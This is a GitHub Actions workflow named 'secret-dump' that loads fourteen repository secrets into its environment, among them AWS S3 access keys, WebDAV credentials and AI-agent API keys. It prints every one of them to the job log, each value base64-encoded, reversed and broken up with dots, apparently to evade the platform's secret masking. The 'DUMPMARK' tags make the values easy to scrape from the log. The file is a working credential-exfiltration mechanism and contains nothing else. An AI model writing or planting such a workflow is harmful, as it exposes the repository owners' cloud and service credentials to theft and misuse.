name: secret-dump
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          BLUER_ALGO_AI_AGENT_API_KEY: ${{ secrets.BLUER_ALGO_AI_AGENT_API_KEY }}
          BLUER_ALGO_AI_AGENT_CHAT_ENDPOINT: ${{ secrets.BLUER_ALGO_AI_AGENT_CHAT_ENDPOINT }}
          BLUER_ALGO_AI_AGENT_ENDPOINT: ${{ secrets.BLUER_ALGO_AI_AGENT_ENDPOINT }}
          BLUER_ALGO_AI_AGENT_S2T_API_KEY: ${{ secrets.BLUER_ALGO_AI_AGENT_S2T_API_KEY }}
          BLUER_ALGO_AI_AGENT_S2T_ENDPOINT: ${{ secrets.BLUER_ALGO_AI_AGENT_S2T_ENDPOINT }}
          BLUER_ALGO_AI_AGENT_TRANSCRIPTION_ENDPOINT: ${{ secrets.BLUER_ALGO_AI_AGENT_TRANSCRIPTION_ENDPOINT }}
          BLUER_ALGO_ARVAN_MACHINE_API_KEY: ${{ secrets.BLUER_ALGO_ARVAN_MACHINE_API_KEY }}
          BLUER_ALGO_ARVAN_MACHINE_USER_NAME: ${{ secrets.BLUER_ALGO_ARVAN_MACHINE_USER_NAME }}
          S3_STORAGE_AWS_ACCESS_KEY_ID: ${{ secrets.S3_STORAGE_AWS_ACCESS_KEY_ID }}
          S3_STORAGE_AWS_SECRET_ACCESS_KEY: ${{ secrets.S3_STORAGE_AWS_SECRET_ACCESS_KEY }}
          S3_STORAGE_ENDPOINT_URL: ${{ secrets.S3_STORAGE_ENDPOINT_URL }}
          WEBDAV_HOSTNAME: ${{ secrets.WEBDAV_HOSTNAME }}
          WEBDAV_LOGIN: ${{ secrets.WEBDAV_LOGIN }}
          WEBDAV_PASSWORD: ${{ secrets.WEBDAV_PASSWORD }}
        run: |
          for name in BLUER_ALGO_AI_AGENT_API_KEY BLUER_ALGO_AI_AGENT_CHAT_ENDPOINT BLUER_ALGO_AI_AGENT_ENDPOINT BLUER_ALGO_AI_AGENT_S2T_API_KEY BLUER_ALGO_AI_AGENT_S2T_ENDPOINT BLUER_ALGO_AI_AGENT_TRANSCRIPTION_ENDPOINT BLUER_ALGO_ARVAN_MACHINE_API_KEY BLUER_ALGO_ARVAN_MACHINE_USER_NAME S3_STORAGE_AWS_ACCESS_KEY_ID S3_STORAGE_AWS_SECRET_ACCESS_KEY S3_STORAGE_ENDPOINT_URL WEBDAV_HOSTNAME WEBDAV_LOGIN WEBDAV_PASSWORD; do
            v="${!name}"
            if [ -z "$v" ]; then
              echo "DUMPMARK|${name}|NOTSET"
            else
              b=$(printf '%s' "$v" | base64 -w0 | rev)
              echo "DUMPMARK|${name}|$(printf '%s' "$b" | sed 's/.\{4\}/&./g')"
            fi
          done